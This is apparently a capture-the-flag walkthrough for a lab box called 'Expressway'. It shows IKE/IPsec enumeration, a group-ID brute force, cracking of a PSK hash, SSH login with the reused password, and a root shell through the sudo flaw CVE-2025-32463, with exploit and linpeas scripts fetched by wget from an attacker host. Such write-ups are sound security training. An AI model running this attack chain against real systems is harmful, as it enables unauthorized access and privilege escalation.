# Expressway - Easy

```sh
sudo vim /etc/hosts
# map target IP to expressway.htb

nmap -T4 -p- -A -Pn -v expressway.htb

# checking with a UDP scan as well
sudo nmap -sU -Pn -v expressway.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 10.0p2 Debian 8 (protocol 2.0)
    * 68/udp - dhcpc
    * 69/udp - tftp
    * 500/udp - isakmp
    * 4500/udp - nat-t-ike

* from the ```nmap``` UDP scan, out of the 4 ports, only port 500 is open, so we can check it further

* ISAKMP is the protocol for IKE/IPSec (used mainly for VPN solutions), and it uses 500/udp by default

* [footprinting ISAKMP/IKE](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting):

    * version detection -

        ```sh
        sudo nmap -sU -p 500 --script ike-version expressway.htb
        ```
    
    * the ```nmap``` script does not give ike-version, but gives its attributes 'XAUTH' and 'Dead Peer Detection v1.0'

    * find a valid transformation for IPSec -

        ```sh
        ike-scan -M expressway.htb
        # -M for multiline

        ike-scan -M -A expressway.htb
        # main mode scanning and aggressive mode detection
        ```
    
    * this returns 'AUTH=PSK', which means the VPN is configured using a preshared key

    * the output also includes an ID of type 'ID_USER_FQDN' with value 'ike@expressway.htb' - indicating we have a user 'ike' on the box

    * also the output mentions '1 returned handshake; 0 returned notify'
    
    * this means the target is configured for IPsec and is willing to perform IKE negotiation, and one or more of the transforms proposed are acceptable

    * in our case, from the output, the transform attributes are -

        * encryption algorithm - 3DES
        * integrity algorithm - SHA1 (HMAC-SHA)
        * authentication type - PSK
        * distribution algorithm - DH group 2, 1024-bit MODP
        * lifetime - 28800 seconds
    
    * so, according to the transform set format from the above guide, our format is ```--trans="5,2,1,2"```
    
    * to capture the hash, we need a valid transform and the correct ID (group name) - as we don't know the valid group name, we need to brute force it

    * bruteforcing ID with ```ike-scan``` (alternative is ```ikeforce``` but that script is outdated):

        ```sh
        ike-scan -P -M -A --id=fakegroupname expressway.htb
        # attempt a request with a fake ID first
        # -P to get hash

        # if no hash is returned, then this method would work
        # if a hash is returned, then it is a fake hash as the ID used is fake

        # in our case a hash is returned
        # so we can try once more by specifying the transform
        ike-scan -P -M -A --trans="5,2,1,2" --id=fakegroupname expressway.htb
        # this too returns a hash

        # bruteforce using ike-scan using wordlist for ike groups
        while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line expressway.htb) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/seclists/Miscellaneous/ike-groupid.txt
        ```
    
    * bruteforcing IDs using ```ike-scan``` gives us several IDs like 'EZ' and 'ike'- we can select any one of them and attempt to capture & crack the hash:

        ```sh
        ike-scan -M -A -n EZ --pskcrack=pskhash.txt expressway.htb
        # as we have a valid transform, group name, and aggressive mode is allowed
        # we can grab the crackable hash

        # crack the hash
        psk-crack -d /usr/share/wordlists/rockyou.txt pskhash.txt
        ```
    
    * cracking the PSK hash gives us cleartext password "freakingrockstarontheroad"

* before we attempt to use this PSK to authenticate to the VPN, we can try to use this password for user 'ike' in the SSH service:

    ```sh
    ssh ike@expressway.htb
    # this password works

    cat user.txt
    # user flag

    sudo -l
    # not working

    # attempt basic enum using linpeas

    # fetch script from attacker
    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* highlights from ```linpeas```:

    * the box is running Linux version 6.16.7+deb14-amd64, release Debian GNU/Linux forky/sid
    * ```sudo``` version is 1.9.17
    * port 25 is listening internally
    * installed mail apps include ```exim``` and ```sendmail```

* before checking on the mail apps, we can check on the ```sudo``` version:

    ```sh
    sudo -V
    # sudo version 1.9.17
    ```

* Googling for exploits associated with this release leads to [CVE-2025-32463](https://github.com/kh4sh3i/CVE-2025-32463) - a local privesc vuln in the ```sudo``` chroot feature

* as CVE-2025-32463 impacts sudo versions 1.9.14 to 1.9.17, we can try exploiting this:

    ```sh
    # fetch exploit script

    wget http://10.10.14.21:8000/CVE-2025-32463.sh

    chmod +x CVE-2025-32463.sh

    ./CVE-2025-32463.sh
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
